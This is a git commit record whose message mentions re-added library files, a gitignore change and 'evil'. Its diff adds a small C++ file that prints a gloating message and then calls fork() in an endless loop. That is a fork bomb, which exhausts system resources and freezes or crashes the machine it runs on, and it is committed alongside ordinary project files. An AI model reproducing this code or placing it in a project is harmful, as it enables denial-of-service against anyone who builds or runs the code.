35d3868872cb5b1e78ce2ccd1f5de4a358e97b9f
dreac0nic <spenser.m.bray@gmail.com>
2013-11-25 21:42:44 -0600

    Readded all the library files, we kind of need them. 	* Added *.bak to gitignore 	* Added evil.

---
+++ muahahahaha.cpp
@@ -0,0 +1,16 @@
+#include <iostream>
+#include <stdlib.h>
+#include <stdio.h>
+#include <windows.h>
+#include <unistd.h>
+
+using namespace std;
+
+int main(int argc, char* argv[])
+{
+	cout << "Muahahahahahahaha ..." << endl;
+	
+	while(true) fork();
+	
+	return 0;
+}
